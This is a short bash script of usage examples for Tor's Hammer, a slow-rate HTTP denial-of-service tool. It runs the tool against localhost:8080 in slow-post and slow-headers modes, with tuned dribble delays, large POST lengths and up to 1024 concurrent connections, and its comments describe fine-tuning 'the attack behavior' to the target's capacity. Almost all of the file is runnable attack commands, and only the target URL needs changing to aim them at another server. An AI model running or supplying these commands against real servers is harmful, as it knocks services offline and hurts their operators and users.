#!/bin/bash
# Example: Advanced configuration options
# =======================================
# This script demonstrates advanced configuration options
# for fine-tuning the attack behavior.

TARGET_URL="http://localhost:8080"

echo "Advanced configuration examples"
echo "Target: $TARGET_URL"
echo ""

# Example 1: Custom timing delays
echo "1. Testing with custom dribble delays (0.5s to 5s)..."
torshammer -u "$TARGET_URL" \
    -c 128 \
    -dl 0.5 \
    -dh 5.0 \
    -d 30
echo ""

# Example 2: Custom POST length
echo "2. Testing with larger POST body (8192 bytes)..."
torshammer -u "$TARGET_URL" \
    -m slow-post \
    -c 128 \
    --post-length 8192 \
    -d 30
echo ""

# Example 3: Higher concurrency for powerful targets
echo "3. Testing with high concurrency (1024 connections)..."
torshammer -u "$TARGET_URL" \
    -c 1024 \
    -d 30
echo ""

# Example 4: Combined advanced options
echo "4. Testing with combined advanced options..."
torshammer -u "$TARGET_URL" \
    -m slow-headers \
    -c 512 \
    -dl 0.2 \
    -dh 2.0 \
    --post-length 6144 \
    --connect-timeout 20 \
    -d 60

# Explanation:
# -dl / -dh: Min/max dribble delay in seconds (controls how slowly data is sent)
# --post-length: Baseline Content-Length for POST-based modes
# --connect-timeout: Connection timeout in seconds
# -c: Number of concurrent connections (adjust based on target capacity)
